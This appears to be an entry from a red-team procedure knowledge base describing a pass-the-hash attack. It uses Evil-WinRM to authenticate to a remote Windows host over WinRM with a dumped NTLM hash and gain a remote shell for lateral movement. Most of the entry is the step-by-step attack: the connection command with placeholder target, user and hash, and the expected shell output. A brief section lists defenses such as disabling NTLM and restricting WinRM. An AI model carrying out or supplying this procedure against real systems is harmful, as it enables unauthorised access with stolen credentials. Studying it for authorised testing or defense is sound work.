---
id: 5e2d35cd-13cf-40f0-aedd-06ef55cf693f
name: Connect-to-WinRM-from-Linux-via-Pass-the-Hash
type: procedure
verified: true
submitted: true
created_at: '2020-03-16T02:05:05.244733+00:00'
updated_at: '2023-05-25T19:44:35.252518+00:00'
tactics:
  - '[[Execution]]'
  - '[[Lateral Movement]]'
techniques:
  - '[[Valid Accounts]]'
  - '[[Pass the Hash]]'
  - '[[Windows Remote Management]]'
sub_techniques: []
tags:
  - network
  - pass-the-hash
  - shell
commands:
  - '[[commands/evil-winrm-rb-connect-with-ntlm-hash]]'
platforms:
  - Windows
tools:
  - '[[tools/Evil-WinRM]]'
validated: true
---

# Connect-to-WinRM-from-Linux-via-Pass-the-Hash

## Summary

This procedure authenticates to a remote Windows system via WinRM using an NTLM hash instead of plaintext password, spawning a shell for lateral movement post-credential dumping.

## Description

Pass-the-Hash exploits NTLM auth where the hash serves as the 'password'. Evil-WinRM supports -H for hash input, enabling access without cracking, useful for speed in large environments.

## Requirements

- NTLM hash from dump
- WinRM enabled on target
- Evil-WinRM installed

## Defense

- Disable NTLM, enforce Kerberos only
- Use LAPS for local admin rotation
- Block WinRM from untrusted networks

## Objectives

1. Use hash for NTLM auth
2. Establish WinRM session
3. Gain remote shell

## Instructions

### Step 1: Prepare Hash

**Context**: Extract 32-char NTLM from dump.

No command; note hash.

### Step 2: Connect with Hash

**Context**: Authenticate via hash.

**Command** ([[commands/evil-winrm-rb-connect-with-ntlm-hash]]):
```bash
evil-winrm.rb -i $_TARGET_IP -u $_USERNAME -H $_NTLM_HASH
```

> No password needed; hash used directly.

### Step 3: Verify Access

**Context**: Run whoami in shell.

**Expected Output**: Shell prompt.

## Expected Output

Evil-WinRM shell v2.3
*Evil-WinRM* PS C:\Users\>
